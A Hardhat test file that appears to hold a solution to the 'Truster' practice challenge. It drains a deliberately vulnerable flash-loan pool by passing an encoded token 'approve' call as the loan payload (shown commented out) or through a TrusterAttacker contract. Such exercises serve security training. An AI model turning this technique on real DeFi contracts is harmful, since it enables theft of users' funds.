const { ethers } = require('hardhat');
const { expect } = require('chai');
const { accounts, contract, web3 } = require("@openzeppelin/test-environment");
// const TrusterAttacker = contract.fromArtifact("TrusterAttacker");

describe('[Challenge] Truster', function () {
    let deployer, attacker, attacker2;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker, attacker2] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        
        // Solution without deploying another contract
        // const approvePayload = web3.eth.abi.encodeFunctionCall(
        //   {
        //     name: "approve",
        //     type: "function",
        //     inputs: [
        //       {
        //         type: "address",
        //         name: "spender",
        //       },
        //       {
        //         type: "uint256",
        //         name: "amount",
        //       },
        //     ],
        //   },
        //   [attacker.address, TOKENS_IN_POOL.toString()]
        // );
        // this.pool.flashLoan(0, attacker.address, this.token.address, approvePayload);
        // await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
        
        const TrusterAttacker = await ethers.getContractFactory('TrusterAttacker', deployer);
        this.attacker = await TrusterAttacker.deploy(this.token.address);
        await this.attacker.connect(attacker).attack(TOKENS_IN_POOL, this.pool.address, attacker.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

